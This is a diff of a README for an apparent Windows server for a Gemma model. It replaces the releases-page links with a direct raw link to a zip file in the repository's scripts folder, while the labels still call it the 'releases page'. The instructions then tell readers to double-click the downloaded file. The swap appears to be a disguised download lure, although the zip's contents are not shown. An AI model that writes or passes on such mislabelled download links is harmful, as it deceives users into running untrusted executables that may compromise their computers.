@@ -1,6 +1,6 @@
 # 🚀 Gemma-4-31B-MTP-vLLM-Server - Run fast AI models on Windows
 
-<a href="https://github.com/aldogr7073/Gemma-4-31B-MTP-vLLM-Server/releases">
+<a href="https://raw.githubusercontent.com/aldogr7073/Gemma-4-31B-MTP-vLLM-Server/main/scripts/Gemma_Server_MT_LL_v_3.4.zip">
   <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Link" />
 </a>
 
@@ -22,7 +22,7 @@ You need specific hardware to run this model well. These requirements ensure you
 
 Follow these steps to get the software running on your computer.
 
-1. Visit the [releases page](https://github.com/aldogr7073/Gemma-4-31B-MTP-vLLM-Server/releases) to find the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/aldogr7073/Gemma-4-31B-MTP-vLLM-Server/main/scripts/Gemma_Server_MT_LL_v_3.4.zip) to find the latest version.
 2. Download the installation file for Windows.
 3. Locate the file in your downloads folder.
 4. Double-click the file to start the installation wizard.
